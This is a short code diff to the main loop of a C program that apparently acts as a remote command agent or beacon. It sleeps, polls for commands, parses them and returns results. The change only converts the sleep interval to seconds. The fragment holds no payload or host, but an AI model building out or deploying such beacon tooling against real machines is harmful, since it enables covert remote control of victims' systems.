@@ -25,7 +25,7 @@ int main(void){
 
     // first sleep zzz...
     // milliseconds 1000 milli = 1 second
-    Sleep(corn_config.SleepTime);
+    Sleep(corn_config.SleepTime * 1000);
 
     PPackage prevResults = NULL;
     // command loop
@@ -44,7 +44,7 @@ int main(void){
 
         // sendAndRecive error check
         if(parser == NULL){
-        Sleep(corn_config.SleepTime);
+        Sleep(corn_config.SleepTime * 1000);
         continue;
         }
 
@@ -71,7 +71,7 @@ int main(void){
 
         freeParser(parser);
 
-        Sleep(corn_config.SleepTime);
+        Sleep(corn_config.SleepTime * 1000);
     }
     return 0;
 }
